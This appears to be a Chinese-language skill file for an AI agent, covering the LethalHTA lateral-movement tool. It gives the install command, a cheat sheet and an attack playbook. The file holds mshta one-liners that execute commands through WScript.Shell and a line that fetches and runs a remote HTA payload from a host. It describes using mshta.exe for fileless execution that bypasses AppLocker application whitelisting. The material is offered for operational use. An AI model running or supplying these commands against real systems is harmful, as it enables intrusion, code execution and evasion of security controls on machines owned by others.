---
name: lethalhta-mshta
description: 渗透工具 skill:LethalHTA 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 LethalHTA 时使用。
when-to-use: 渗透工具 skill:LethalHTA 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 LethalHTA 时使用。
---

# LethalHTA

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/codewhitesec/LethalHTA
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/codewhitesec/LethalHTA
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `mshta.exe 'javascript:RnK5=new ActiveXObject("WScript.Shell");RnK5.Run("cmd /c whoami",0);close();'` | 直接执行 |
| `mshta http://10.0.0.5/payload.hta` | 远程 HTA |
| `Rundll32 混淆变体` | 参考 README |

## 攻击场景 Playbook

### mshta 白名单执行

```bash
mshta 'javascript:o=new ActiveXObject("WScript.Shell");o.Run("calc.exe",0);close();'
# 常被 AppLocker 白名单放行 mshta.exe
```

## 注意事项

codewhitesec 出品,mshta.exe 无文件执行载荷的技术合集,绕过应用白名单。
